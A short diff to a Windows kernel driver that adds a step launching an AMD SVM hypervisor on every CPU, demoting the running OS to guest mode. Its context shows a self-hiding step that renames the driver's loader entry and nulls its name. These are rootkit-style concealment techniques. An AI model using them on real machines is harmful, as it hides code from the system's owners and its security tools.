@@ -487,6 +487,17 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT Driver, PUNICODE_STRING RegPath)
 
     start_watchdog();
 
+    /* Phase 2.0: demote every active CPU to guest mode. Done after
+     * svm_init_all_cpus (VMCB + EFER.SVME) and before stealth_apply so
+     * the KLDR rename step and anything after runs with the HV already
+     * live. svm_launch_all_cpus pins the thread to each CPU in turn and
+     * calls svm_launch; on return that CPU is live in guest mode. */
+    st = svm_launch_all_cpus();
+    if (!NT_SUCCESS(st)) {
+        CHAMBER_LOG_ERR("svm_launch_all_cpus failed 0x%08x\n", st);
+        goto fail;
+    }
+
     /* Self-hide: rename our KLDR entry + null driver name.  Keep the
      * crash marker set across stealth_apply so a bugcheck from the
      * KLDR walk leaves a next-boot refuse-to-load gate. */
